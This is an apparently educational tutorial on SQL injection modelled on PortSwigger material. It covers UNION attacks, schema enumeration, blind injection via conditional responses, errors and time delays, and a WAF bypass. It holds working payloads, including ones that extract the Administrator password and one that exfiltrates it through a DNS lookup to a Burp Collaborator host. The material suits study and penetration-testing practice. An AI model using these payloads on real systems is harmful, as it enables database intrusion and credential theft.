## SQL injection UNION attacks

The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

For a UNION query to work, two key requirements must be met: - The individual queries must return the same number of columns. - The data types in each column must be compatible between the individual queries.
To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out: 1. How many columns are being returned from the original query. 2. Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

### Determining the number of columns required

- One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
  if the injection point is a quoted string within the WHERE clause of the original query, you would submit:
  ' ORDER BY 1--
  ' ORDER BY 2--
  ' ORDER BY 3--
  etc.
  The database returns an error, such as: - The ORDER BY position number 3 is out of range of the number of items in the select list. - The application might actually return the database error in its HTTP response, but it may also issue a generic error response.
- The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:

```sql
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    etc.
```

    - If the number of nulls does not match the number of columns, the database returns an error, such as:
    All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
    - We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
    - As with the ORDER BY technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.
    - The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.

### Database-specific syntax

- On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:

```sql
' UNION SELECT NULL FROM DUAL--
```

The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point.

- On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.

Reference: https://portswigger.net/web-security/sql-injection/cheat-sheet

### Finding columns with a useful data type

- The interesting data that you want to retrieve is normally in string form.
- This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
- You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the column data type is not compatible with string data, the injected query will cause a database error, such as:
Conversion failed when converting the varchar value 'a' to data type int.

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

### Retrieving multiple values within a single column

- In some cases the query in the previous example may only return a single column.
- You can retrieve multiple values together within this single column by concatenating the values together.
- You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
  `' UNION SELECT username || '~' || password FROM users--`

### Retrieving data from other database tables

In cases where the application responds with the results of a SQL query, an attacker can use a SQL injection vulnerability to retrieve data from other tables within the database. You can use the UNION keyword to execute an additional SELECT query and append the results to the original query.

For example, if an application executes the following query containing the user input Gifts:
SELECT name, description FROM products WHERE category = 'Gifts'

An attacker can submit the input:
' UNION SELECT username, password FROM users--

### Querying the database type and version

- The following are some queries to determine the database version for some popular database types:

```
Database type 	    Query
Microsoft, MySQL 	SELECT @@version
Oracle 	            SELECT * FROM v$version
PostgreSQL 	        SELECT version()
```

- For example, you could use a UNION attack with the following input:
  `' UNION SELECT @@version--`

### Listing the contents of the database

- Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
  - For example, you can query information_schema.tables to list the tables in the database:
    `SELECT * FROM information_schema.tables`
    TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
    =====================================================
    MyDatabase dbo Products BASE TABLE
    MyDatabase dbo Users BASE TABLE
    MyDatabase dbo Feedback BASE TABLE
    This output indicates that there are three tables, called Products, Users, and Feedback.
  - You can then query information_schema.columns to list the columns in individual tables:
    `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
    TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
    =================================================================
    MyDatabase dbo Users UserId int
    MyDatabase dbo Users Username varchar
    MyDatabase dbo Users Password varchar

### Listing the contents of an Oracle database

- On Oracle, you can find the same information as follows:
  - You can list tables by querying all_tables:
    `SELECT * FROM all_tables`
  - You can list columns by querying all_tab_columns:
    `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

### Exploiting blind SQL injection by triggering conditional responses

- Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
  Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

- When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
  SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

- This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response.

- This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.

- To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
  …xyz' AND '1'='1
  …xyz' AND '1'='2
  - The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
  - The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
  - This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

### Error-based SQL injection

- Refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses
- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones.

#### Exploiting blind SQL injection by triggering conditional errors

- Suppose that two requests are sent containing the following TrackingId cookie values in turn:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

- These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true:
  - With the first input, the CASE expression evaluates to 'a', which does not cause any error.
  - With the second input, it evaluates to 1/0, which causes a divide-by-zero error.

- If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

- Using this technique, you can retrieve data by testing one character at a time:
  xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

#### Extracting sensitive data via verbose SQL error messages

- Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

- You can use the CAST() function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:
  `CAST((SELECT example_column FROM example_table) AS int)`
- Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following:
  ERROR: invalid input syntax for type integer: "Example data"
  This type of query may also be useful if a character limit prevents you from triggering conditional responses.

### Exploiting blind SQL injection by triggering time delays

- If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response.
- As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response.
- For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- The first of these inputs does not trigger a delay, because the condition 1=2 is false.
- The second input triggers a delay of 10 seconds, because the condition 1=1 is true.
- Using this technique, we can retrieve data by testing one character at a time:

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

### Exploiting blind SQL injection using out-of-band (OAST) techniques

- In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
  A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service).
- The techniques for triggering a DNS query are specific to the type of database being used.

#### Using out of band channel to exfiltrate data

ex:

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

- This input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
  `S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

### SQL injection in different contexts

- Some websites take input in JSON or XML format and use this to query the database.
- These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords.
- For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

This will be decoded server-side before being passed to the SQL interpreter.
